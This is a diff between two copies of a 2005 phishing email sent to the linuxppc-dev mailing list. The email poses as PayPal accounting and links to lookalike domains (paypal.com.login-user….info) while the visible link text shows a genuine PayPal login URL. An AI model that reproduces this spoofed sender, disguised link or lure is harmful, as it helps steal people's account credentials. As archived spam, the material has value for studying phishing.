@@ -2,13 +2,13 @@ Return-Path: <sam@ss.lokal.ca>
 Received: from ss.lokal.ca (unknown [208.38.21.30])
 	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
 	(Client did not present a certificate)
-	by ozlabs.org (Postfix) with ESMTP id 9BE5C679E7
-	for <linuxppc-dev@ozlabs.org>; Tue,  7 Jun 2005 07:04:14 +1000 (EST)
+	by ozlabs.org (Postfix) with ESMTP id 60A0F679F2
+	for <linuxppc-dev@ozlabs.org>; Tue,  7 Jun 2005 10:11:26 +1000 (EST)
 Received: from ss.lokal.ca (localhost.localdomain [127.0.0.1])
-	by ss.lokal.ca (8.12.10/8.12.10) with ESMTP id j56L6kSW017657
-	for <linuxppc-dev@ozlabs.org>; Mon, 6 Jun 2005 15:06:46 -0600
-Date: Mon, 6 Jun 2005 15:06:46 -0600
-Message-Id: <200506062106.j56L6kis017652@ss.lokal.ca>
+	by ss.lokal.ca (8.12.10/8.12.10) with ESMTP id j56JMVSW023282
+	for <linuxppc-dev@ozlabs.org>; Mon, 6 Jun 2005 13:22:31 -0600
+Date: Mon, 6 Jun 2005 13:22:31 -0600
+Message-Id: <200506061922.j56JMVRf023277@ss.lokal.ca>
 To: linuxppc-dev@ozlabs.org
 From: "accounting@paypal.com" <service@paypal.com>
 Content-Type: text/html
@@ -39,7 +39,7 @@ you for your cooperation in this manner.<br>
 To confirm your identity please follow the link below:<br>
 <br>
 <a 
-href="http://paypal.com.login-user1962.info/webscr.php?cmd=LogIn">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a>
+href="http://paypal.com.login-user2374.info/webscr.php?cmd=LogIn">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a>
 <br>
 <br><br>
 <br>
